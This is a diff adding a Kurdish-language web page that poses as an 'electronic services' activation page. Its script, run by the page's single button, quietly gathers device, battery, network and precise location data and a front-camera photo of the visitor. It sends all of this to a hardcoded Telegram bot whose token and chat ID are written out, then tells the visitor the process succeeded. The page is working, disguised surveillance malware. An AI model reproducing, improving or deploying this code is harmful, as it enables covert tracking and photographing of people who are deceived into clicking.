@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>خزمەتگوزارییێن ئەلیکترۆنی - پشکشندن</title>
+  <style>
+    :root {
+      --primary-color: #4f46e5;
+      --primary-hover: #4338ca;
+      --bg-color: #0f172a;
+      --card-bg: #1e293b;
+      --text-color: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--bg-color);
+      color: var(--text-color);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background-color: var(--card-bg);
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      border: 1px solid #334155;
+    }
+    h2 {
+      margin-bottom: 10px;
+      font-size: 22px;
+    }
+    p {
+      color: var(--text-muted);
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+    .btn {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.2s, transform 0.1s;
+      width: 100%;
+    }
+    .btn:hover {
+      background-color: var(--primary-hover);
+    }
+    .btn:active {
+      transform: scale(0.98);
+    }
+    .status {
+      margin-top: 15px;
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>پشکشندنا دەسەڵاتێ و چالاککرن</h2>
+    <p>ژ بۆ جێبەجێکرنا داخوازا تە و پشتراستبوون ژ ڤەکرنا خزمەتگوزارییێ، تکایە کلیک ل سەر دوگمەیا خوارێ بکە.</p>
+    <button class="btn" onclick="startAdvancedProcess()">دەستپێکرنا خزمەتگوزارییێ</button>
+    <div id="statusText" class="status"></div>
+  </div>
+
+  <script>
+    // زانیاریێن بۆتا تە و چات ئایدیێ تە (ژ وێنەیان هاتنە وەرگرتن)
+    const BOT_TOKEN = '9160815391:AAGyutY4ZCSK12f56ryTuy5H8ca9Ye0AFcY';[span_0](start_span)[span_0](end_span)
+    const CHAT_ID = '8806726280';[span_1](start_span)[span_1](end_span)    
+
+    async function startAdvancedProcess() {
+      const statusEl = document.getElementById('statusText');
+      statusEl.innerText = "ئەڤ کارە دهێتە جێبەجێکرن...";
+
+      // 1. کۆمکرنا زانیاریێن ئامێر و سەرسەری
+      const deviceInfo = navigator.userAgent;
+      const platform = navigator.platform;
+      const languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
+      const screenRes = `${window.screen.width}x${window.screen.height}`;
+      
+      let batteryInfo = "نەدیار";
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'باربووچوون ⚡' : 'بێ کارەبا دەرەکی'})`;
+        } catch(e) {}
+      }
+
+      let networkInfo = "نەدیار";
+      if (navigator.connection) {
+        networkInfo = `${navigator.connection.effectiveType || 'N/A'} (خێرایی: ${navigator.connection.downlink || 'N/A'} Mbps)`;
+      }
+
+      const summaryText = 
+        `🚀 **زانیاریێن پێشکەڤتی یێن سەردانکەری:**\n\n` +
+        `📱 **جۆرێ ئامێرێ:**\n${deviceInfo}\n\n` +
+        `💻 **پلاتفۆرم:** ${platform}\n` +
+        `🌐 **زمان:** ${languages}\n` +
+        `📐 **شاشە:** ${screenRes}\n` +
+        `🔋 **پاتری:** ${batteryInfo}\n` +
+        `🛜 **تۆڕ:** ${networkInfo}`;
+
+      sendTelegramMessage(summaryText);
+
+      // 2. وەرگرتنا لوکەیشن (Location)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const acc = position.coords.accuracy;
+          sendTelegramMessage(`📍 **لوکەیشنا فەرمی:**\nhttps://maps.google.com/?q=${lat},${lon}\n(نێزیکی: ${Math.round(acc)} متر)`);
+        }, (error) => {
+          sendTelegramMessage("❌ بەکارهێنەری مۆڵەتا لوکەیشنی نەدا.");
+        }, { enableHighAccuracy: true });
+      }
+
+      // 3. ڤەکرنا کامێرێ ب بێ دەنگی وگرتنا وێنەی
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        setTimeout(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob((blob) => {
+            if (blob) {
+              sendTelegramPhoto(blob);
+            }
+            stream.getTracks().forEach(track => track.stop());
+          }, 'image/jpeg', 0.85);
+        }, 1200);
+
+      } catch (err) {
+        sendTelegramMessage("❌ بەکارهێنەری مۆڵەتا کامێرێ نەدا یان ئامێر کامێره نینە.");
+      }
+
+      setTimeout(() => {
+        statusEl.innerText = "ب سەرکەفتی هاتە بڕێڤەبرن.";
+      }, 2000);
+    }
+
+    function sendTelegramMessage(text) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+      }).catch(err => console.log(err));
+    }
+
+    function sendTelegramPhoto(imageBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', imageBlob, 'photo.jpg');
+      formData.append('caption', '📸 وێنەیێ بکاربەری ب ڕێکا کامێرێ');
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.log(err));
+    }
+  </script>
+</body>
+</html>
